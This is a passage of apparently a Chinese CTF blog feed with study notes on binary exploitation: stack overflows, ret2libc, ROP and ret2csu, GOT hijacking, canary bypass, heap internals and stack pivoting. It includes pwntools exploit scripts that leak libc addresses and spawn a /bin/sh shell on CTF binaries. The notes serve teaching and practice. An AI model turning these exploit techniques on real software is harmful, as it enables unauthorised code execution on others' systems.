class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xeb</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">'[+]read_addr: '</span>,hex(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算libc_base，system_addr，bin_sh_addr</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行payload</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xe7</span>+<span class="string">b'b'</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><ul><li>payload = padding1 + address of system() + padding2 + address of “/bin/sh”</li><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027214118134.png" alt=""></li><li>Padding1 随意填充,==长度刚好覆盖基地址==<ul><li>长度与shellcode处的一样的方法</li></ul></li><li>address of system() 是system在内存中的地址,==用来覆盖返回地址==<ul><li>system()函数地址在哪里?<ul><li>从动态库中获取,计算绝对地址</li></ul></li></ul></li><li>padding2 数据长度应该为 ==4== (32位机) 由于不关心退出shell后的行为,可随意填<ul><li>⚠️当需要多次绕过时,这里应该填充system执行后需要返回的地址,否则程序栈会崩溃</li></ul></li><li>address of  ”/bin/sh“ 是字符串在内存中的地址,作为传给system的参数<ul><li>字符串哪里找?<ul><li>动态库搜索,计算绝对地址</li><li>没有就将其加入环境变量,通过getenv()函数获取</li></ul></li></ul></li></ul><h4 id="3-ROP-开启NX时可用-–指向内存中已有的某段指令"><a href="#3-ROP-开启NX时可用-–指向内存中已有的某段指令" class="headerlink" title="3.ROP(开启NX时可用)–指向内存中已有的某段指令"></a>3.ROP(开启NX时可用)–指向内存中已有的某段指令</h4><ul><li><p>payload = padding + address of gadget</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029152817870.png" alt=""></p></li></ul><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029153008692.png" alt=""></p><p>  ​    </p><ul><li><p>ROP的常见拼凑效果是实现一次系统调用</p></li><li><p>如何寻找指令片段?</p><ul><li>使用工具寻找以ret结尾的片段</li></ul></li><li><p>如何寻找系统调用的参数?</p><ul><li>可以使用pop指令将栈顶数据存入寄存器</li><li>如果内存中有可以用move指令进行传输</li></ul></li><li><p>对于单个gadget,pop所传输的数据因该在gadget地址之后</p><ul><li>具体的ROP例子<ul><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030080246816.png" alt=""></li></ul></li></ul></li><li><p>适用于题目中没有给出任何有关cat flag有关信息,并且题目中也没有任何与system有关的函数</p><ul><li>此时需要我们leak除libc函数的地址,再通过libc构造ROP</li></ul></li></ul><h4 id="3-2-中级ROP"><a href="#3-2-中级ROP" class="headerlink" title="3.2 中级ROP"></a>3.2 中级ROP</h4><ul><li><p>ret2_libc_csu_init</p><ul><li><p>在64位程序中，函数的前六个参数是通过寄存器传参的，但是大多数时候，我们很难找到每个寄存器对应的gadgets，这个时候我们可以用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><ul><li>这里如果巧妙的控制==rbx==与==r12==,我们就可以调用我们想要调用的函数.例如设置rbx=0,r12位存储我们想要调用的函数的地址.</li></ul></li></ul></li></ul><h5 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">main_addr = <span class="number">0x40051d</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">csu_front_addr = <span class="number">0x40059A</span></span><br><span class="line">csu_end_addr = <span class="number">0x400580</span></span><br><span class="line">ret_addr = <span class="number">0x400519</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(vul_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#泄露出来argv的地址</span></span><br><span class="line">log.info(<span class="string">'leaked_addr===&gt;'</span>+hex(leak_addr))</span><br><span class="line"><span class="comment">#print("----------&gt;",hex(leak_addr - 0x118))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">bin_sh = leak_addr - <span class="number">0x128</span></span><br><span class="line"><span class="comment">#用偏移通过argv找到binsh地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(mov_rax_59) + p64(csu_front_addr)</span><br><span class="line"><span class="comment">#ebp处放给寄存器rax赋值的地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bin_sh+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#这里就是巧妙的执行利用，rbx 与 r12执行了mov_rax_59的操作</span></span><br><span class="line"><span class="comment">#bin_sh+0x10的位置放得是执行mov rax 59 地址的地址，也就是rbp此时指向的地址</span></span><br><span class="line"><span class="comment">#后面的三个0是给execv函数传参，/bin/sh在4字节的edi中放不下，所以这里我们先传0，下面再pop_rdi</span></span><br><span class="line">payload += p64(csu_end_addr)</span><br><span class="line">payload += <span class="number">0x38</span>*<span class="string">b'A'</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line"><span class="comment">#寄存器被赋值之后执行syscall，它会自动匹配要执行execv，然后回去64位对应的寄存器里面找参数</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><ul><li>可以利用的csu</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2020/12/12/PWN-缓冲区溢出原理/../../../../Desktop/ctf_huzai/win/writeup/pic/QQ%E6%88%AA%E5%9B%BE20201118220313.png" alt=""></h2><ul><li>用gdb+pwn 进行动态调试,得到函数栈中的状态与payload的对应关系,如下</li></ul><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/buuoj_00039.png" alt=""></p><p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/buuoj_00038.png" alt=""></p><h4 id="4-hijiack-got-–-修改某个被调用函数的地址-让其指向另一个地址"><a href="#4-hijiack-got-–-修改某个被调用函数的地址-让其指向另一个地址" class="headerlink" title="4.hijiack got – 修改某个被调用函数的地址,让其指向另一个地址"></a>4.hijiack got – 修改某个被调用函数的地址,让其指向另一个地址</h4><ul><li><p>动态链接与静态链接</p><ul><li>静态链接<ul><li>把需要调用的函数或者过程链接到可执行文件中,成为可执行文件的一部分,使得文件包含运行时的全部代码,当多个程序调用相同函数时,内存中就会出现多个这个函数的拷贝,浪费内存</li></ul></li><li>动态链接<ul><li>仅仅在调用处加入了所调用函数的描述信息(往往是一些重定位信息),当程序运行时,才回去动态的链接到相应的函数,动态链接库的文件后缀为.so</li><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030075922270.png" alt=""></li></ul></li></ul></li><li><p>GOT与PLT</p><ul><li><p>GOT(global offset table) 全局偏移量表,用来储存外部函数在内存的确切地址</p></li><li><p>PLT(procedure linkage table) 程序链接表,用来存储外部函数的入口点</p></li><li><p>第一次调用函数时解析函数地址并存入GOT表</p><ul><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029154651550.png" alt=""></li></ul></li><li><p>第二次调用函数直接读取GOT中的地址</p><ul><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029154754376.png" alt=""></li></ul></li><li><p>整个调用的过程</p><ul><li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030080054235.png" alt=""></li></ul></li></ul></li></ul><ul><li><p>如何确定函数A在GOT表中的位置?</p><ul><li>程序调用函数是通过PLT表跳转到GOT表的对应条目,在汇编指令中找到该函数在PLT中的入口点位置,从而定位到该函数在GOT中 的条目</li></ul></li><li><p>如何确定函数B在内存中的位置?</p><ul><li>函数在动态链接库中的位置是相对固定的.如果知道了函数A的运行地址(读取GOT表中的内容),也知道A和B在动态链接库中的相对位置,就可一推断出B的运行时地址</li></ul></li><li><p>如何实现GOT表中的数据修改?</p><ul><li>格式化字符串漏洞</li></ul></li></ul><h4 id="5-Return-to-dl-resolve"><a href="#5-Return-to-dl-resolve" class="headerlink" title="5.Return-to-dl_resolve"></a>5.Return-to-dl_resolve</h4><ul><li>核心思想是利用dl_runtime_resolve函数解析出system函数的地址,通常在没有提供lib函库的情况下使用.</li><li>使用条件<ul><li>未给出libc库</li><li>没有开启PIE保护,如果开启PIE需要通过泄漏获取基地址</li><li>没有开启FULL RELOAD</li><li></li></ul></li></ul><h3 id="3-payload与函数调用栈的关系"><a href="#3-payload与函数调用栈的关系" class="headerlink" title="3. payload与函数调用栈的关系"></a>3. payload与函数调用栈的关系</h3><ul><li>payload的长度可以用 payload.ljust(0x105,b’a’)进行填充,使得填充后的payload的总长度为0x106 Bytes </li><li><p>⚠️p32(0xdeadbeef) 占4个Byte</p></li><li><p>paylaod的实际意义是通过输入的溢出,将我们需要的指令送到ip让cpu执行</p><ul><li>下图是64位,中的对应关系</li></ul></li></ul><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201106110733512.png" alt=""></p><p>​            经过gdb+pwn调试，得到正确的关系，main实际上是返回值</p><p>​            <img src="/2020/12/12/PWN-缓冲区溢出原理/payload64.png" alt=""></p><ul><li><p>下图是32位中的对应关系</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201106172618456.png" alt=""></p></li></ul><h3 id="4-通用的gadget"><a href="#4-通用的gadget" class="headerlink" title="4.通用的gadget"></a>4.通用的gadget</h3><h5 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init()"></a>__libc_csu_init()</h5><ul><li><p>在程序编译的过程中,会自动加入一些通用函数的初始化工作,这些初始化函数都是相同的,因此可以考虑在这些函数中找到一些通用的gadget</p><ul><li><p>需要关注的寄存器</p><ul><li><p>r12  保存着将要调用函数的指针的地址</p></li><li><p>rcx  r8  r9  第四五六个参数</p></li><li><p>rdx   第三个参数</p></li><li><p>rsi    第二个参数</p></li><li><p>rdi   第一个参数</p></li><li><p>rbx 和 rbp 的值分别为0 1 </p></li></ul></li></ul></li></ul><h3 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h3><ul><li><p>linux中的cookies,用来检测溢出并阻止溢出操作</p></li><li><p>其原理是当程序启用canary编译后,在函数序言部分会取fs寄存器0x20处的值.存放在栈中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov qword ptr [rbp-8], rax</span><br></pre></td></tr></table></figure></li><li><p>在函数返回之前,会将该值取出,并与fs:0x28的值进行亦或.这个操作既检测是否发生栈溢出</p></li><li><p>如果canary已经被非法修改,此时程序流程会走到__stack_chk_fail</p><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201104214925462.png" alt=""></p></li></ul><ul><li><p>通过格式化字符串绕过canary</p><ul><li>由于格式化字符串漏洞会导致任意地址泄漏,因此,只要得到输入参数在栈中的位置,就可以通过偏移得到canary在栈中的位置</li><li>然后在栈溢出的padding块把canary所在的位置的值用正确的canary替换,从而绕过canary检测</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PWN CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN-堆相关的漏洞</title>
      <link href="/2020/12/12/PWN-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/12/12/PWN-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="堆相关的漏洞"><a href="#堆相关的漏洞" class="headerlink" title="堆相关的漏洞"></a>堆相关的漏洞</h2><h3 id="1-堆介绍"><a href="#1-堆介绍" class="headerlink" title="1.堆介绍"></a>1.堆介绍</h3><ul><li>结构示意图<ul><li><img src="/2020/12/12/PWN-堆相关的漏洞/image-20201117102955545.png" alt="image-20201117102955545"></li><li>N位：define NON_MAIN_ARENA 用于表示是否属于主线程，0表示主线程的堆块结构，1表示子线程的堆块结构</li><li>M位：define IS_MAPPED 0X2 用于表示是否由mmap分配，0表示由堆块中的top chunk分裂产生，1表示由mmap分配</li><li>P位：define PREV_ISUSE 0x1 用于表示上一堆块是否处于空闲状态，0表示处于空闲状态，1表示处于使用状态。主要用于来判断free是否能够上一堆块进行合并</li></ul></li><li>堆空闲块管理结构bin<ul><li>当allocated chunk被释放以后，会放入bin或者top chunk中去。bin的作用是加快分配速度，其通过链表方式（chunk结构体中的fd和bk指针）进行管理</li><li>fast bin<ul><li>单链表结构进行组织，用fd指针指向下一堆块，采用LIFO机制</li><li>它将堆块的p标志为都设为1，处于占用状态，以防止释放时fast bin进行合并，用于快速分配小内存</li></ul></li></ul></li><li>malloc基本规则<ul><li>将申请size按照一定的规则对齐，得到最终要分配的大小size_real<ul><li>X86:size+4 按照0x10字节对齐</li><li>X64：size+8按照0x20字节对齐</li></ul></li><li>检查size_real 是否符合fast bin 的大小，若是则查看fast bin中对应的size_real 的那条链表中是否存在堆块，若是则分配，否则进行下一步</li><li>检查size-real 是否符合small bin 的大小，若是则查看fast bin中对应的size_real 的那条链表中是否存在堆块，若是则分配，否则进行下一步</li><li>检查size-real 是否符合large bin 的大小，若是则调用malloc_consolidate函数对fast bin中所有堆块进行合并，其过程为将fast bin中的堆块取出，清除下一块的p标识位并进行堆块合并，将最终的堆块放入unsorted bin。然后在small bin 和large bin中找到合适size_real大小的块。若找到则分配，并将多余的部分放入unsorted bin ，否则下一步</li><li>检查top chunk的大小是否符合size_real的大小，若是则分配前面一部分，并重新设置top chunk，否则调用malloc_consolidate函数对fast bin中所有的堆块进行合并，若依然不否，则借助系统调用来开辟新的空间进行分配，若还是不满足，则返回失败</li></ul></li><li>free 基本规则<ul><li>首先会检查地址是否对齐,并根据size找到下一块的位置,检查其p标识位是否为1</li><li>检查释放块的size是否符合fastbin的大小区间,若是则直接放入fast bin,并保持下一堆块中的p标识位为1不变(这样可以避免在前后块释放时进行堆块的合并,以方便快速分配小内存),否则进行下一步</li><li>若本堆块size域中的p标识位为0(前一堆块处于释放状态)则利用本快的pre_size找到前一堆块的开头,将其从bin链表中摘除(unlink),并合并这两个块,得到新的释放块</li><li>根据size找到下一堆块,如果是top chunk,则直接合并到top chunk中,直接返回.否则检查最后一堆块是否处于释放状态(通过检查下一堆块的p标识位是否为0).将其从bin链表中摘除(unlink),并合并这两块,得到新的释放块.</li><li>将上述合并得到的最终堆块放入unstorted bin中去</li></ul></li><li>tcache<ul><li>作用<ul><li>提高堆的使用效率</li></ul></li><li>注意点<ul><li>tcache的管理是单链表,采用LIFO原则</li><li>tcache的管理结构存在于堆中,默认有64个entry,每个entry最多存放7个chunk</li><li>tcache的next指针指向chunk的数据区</li><li>tcache的某个entry被占满以后,符合该entry大小的chunk被free后的规则和原有机制相同</li></ul></li></ul></li></ul><h3 id="2-相关的数据结构"><a href="#2-相关的数据结构" class="headerlink" title="2. 相关的数据结构"></a>2. 相关的数据结构</h3><h4 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h4><h5 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h5><p>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h5><ul><li><p>ptmalloc 根据chunk的大小以及使用状态将chunk分为4类:fast bin, small bin, large bin, unstorted bin</p></li><li><p>一个bin相当于一个chunk链表</p></li><li>fast bin 采用LIFO策略,支持的最大的chunk的数据空间大小为64字节,最大支持的bin的个数位10,inuse位始终置为1,防止被合并</li><li>small bins中每个chunk的大小与其所在bin的index的关系为:chunk_size = 2*size_sz*index</li></ul><h5 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h5><p>程序第一次进行malloc的时候,heap会被分成两块,一块给用户,剩下的那块就是Top Chunk(处于当前堆的物理地址最高的chunk,不属于任何bin),它的作用是在当前所有bin都无法满足用户的请求大小时,如果其满足大小,就进行分配,将剩下的部分作为新的TopChunk.否则对heap进行扩展后再进行分配.</p><h4 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h4><h5 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h5><p>​    程序刚开始执行时是没有heap区域的,当其申请内存时,就需要一个结构记录对应的信息,而且一般当前的heap资源被用完后,重新申请的heap一般是不连续的,因此需要记录不同heap之间连接结构,而heap的作用就是这个</p><h5 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h5><p>该结构用于管理堆,记录每个arena当前申请内存的具体状态,比如是否有空闲的chunk等,他是一全局变量存储在libc.so中</p><h3 id="3-深入理解堆的实现"><a href="#3-深入理解堆的实现" class="headerlink" title="3.深入理解堆的实现"></a>3.深入理解堆的实现</h3><p>宏观角度</p><pre><code>- 创建堆- 堆初始化- 删除堆</code></pre><p>微观角度</p><ul><li>申请内存块</li><li>释放内存块</li></ul><h3 id="3-相关的漏洞"><a href="#3-相关的漏洞" class="headerlink" title="3.相关的漏洞"></a>3.相关的漏洞</h3><h4 id="1-最基本的堆漏洞"><a href="#1-最基本的堆漏洞" class="headerlink" title="1. 最基本的堆漏洞"></a>1. 最基本的堆漏洞</h4><ul><li>由于对堆内容类型判断不明而形成的错误引用,通常情况下,可以使用堆块存储复杂的结构体,其中可能会包括函数指针、变量、数组等成员.如果一个结构体数据按照其他结构体格式来解析,那么只要在特定的域布置好数据,就会导致漏洞的发生.</li></ul><h4 id="2-堆缓冲区溢出"><a href="#2-堆缓冲区溢出" class="headerlink" title="2.堆缓冲区溢出"></a>2.堆缓冲区溢出</h4><ol><li><p>常规溢出</p><p>堆缓冲区溢出与栈缓冲区溢出类似</p></li><li><p>Off By One</p><p>只能溢出一子节,通常位于堆块末尾,溢出的1子节恰好能够覆盖下一堆块的size域的最低位,难以利用,一般有固定的套路</p></li><li><p>Use After Free</p><p>若堆指针在释放后未被置空,形成悬挂指针(野指针),当下次访问该指针时,依然能够访问到原始指针指向的堆内容</p><ol><li>申请一段空间,并将其释放,释放后并不将指针置为空,因此这个指针仍然可以使用,把这个指针简称为p1</li><li>申请空间p2,由于malloc分配过程使得p2指向的空间为刚刚释放的p1指针的空间,构造恶意数据将这段内存空间布局好,既覆盖p1中的数据</li><li>可利用p1,一般多有一个函数指针,由于之前已经使用P2将P1中的数据覆盖了,所以此时的数据即是我们可以控制的,既存在劫持函数流的情况</li></ol></li><li><p>Doubble Free</p><p>对指针进行多次释放.多次释放会使堆块发生重叠,前后申请的堆块可能会指向同一块内存</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> PWN CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN-堆栈平衡</title>
      <link href="/2020/12/12/PWN-%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/"/>
      <url>/2020/12/12/PWN-%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="堆栈平衡和栈转移"><a href="#堆栈平衡和栈转移" class="headerlink" title="堆栈平衡和栈转移"></a>堆栈平衡和栈转移</h2><h3 id="1-栈平衡"><a href="#1-栈平衡" class="headerlink" title="1.栈平衡"></a>1.栈平衡</h3><h4 id="1-为什么需要堆栈平衡"><a href="#1-为什么需要堆栈平衡" class="headerlink" title="1.为什么需要堆栈平衡?"></a>1.为什么需要堆栈平衡?</h4><ul><li>保持栈的大小,是ESP始终指向栈顶</li></ul><h4 id="2-概念"><a href="#2-概念" class="headerlink" title="2.概念"></a>2.概念</h4><ul><li>函数如果要返回父程序,则在堆栈中进行操作时,一定要在RET指令之前,将ESP指向函数压入栈中时的地址</li><li>如果通过堆栈传递参数了,那么在函数执行完毕后,要平衡参数导致的堆栈变化</li></ul><h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h4><ul><li>当函数在栈中操作时,需要先把ESP交给<strong>EBP</strong>,然后继续操作,当操作完成后,在<strong>ret</strong>之前,要先将<strong>ESP</strong>恢复成进入栈之前的状态,最后再将<strong>EBP</strong>移除栈</li></ul><h3 id="2-栈转移"><a href="#2-栈转移" class="headerlink" title="2.栈转移"></a>2.栈转移</h3><h4 id="1-为什么需要栈转移"><a href="#1-为什么需要栈转移" class="headerlink" title="1.为什么需要栈转移?"></a>1.为什么需要栈转移?</h4><ul><li>在栈空间不够存放payload的情况下,需要一个新的地址空间存放payload</li><li>开启PIE保护,栈地址未知,我们可以将栈劫持到已知的区域</li></ul><h4 id="2-概念-1"><a href="#2-概念-1" class="headerlink" title="2.概念"></a>2.概念</h4><ul><li>劫持栈的rsp(ESP),使其指向其他位置,形成一个伪造的栈,在此栈中做ROP</li></ul><h4 id="3-必要的gadget"><a href="#3-必要的gadget" class="headerlink" title="3.必要的gadget"></a>3.必要的gadget</h4><ul><li>pop ebp;ret   释放EBP,并连接伪造的栈</li><li>leave;ret 更改ESP,指向后续的payload</li></ul><h4 id="4-原理"><a href="#4-原理" class="headerlink" title="4.原理"></a>4.原理</h4><ul><li>通过 <strong>pop ebp;ret + 伪造的栈</strong>让程序直接跳转到伪造的栈里面,然后为了保持栈平衡,从而执行 <strong>leave ;ret</strong>,最后继续执行伪造栈内的payload</li></ul><h4 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h4><ul><li>使用输入函数(如read),将后续的payload加载到bss段内,也就是伪造的栈</li><li>通过 <strong>pop 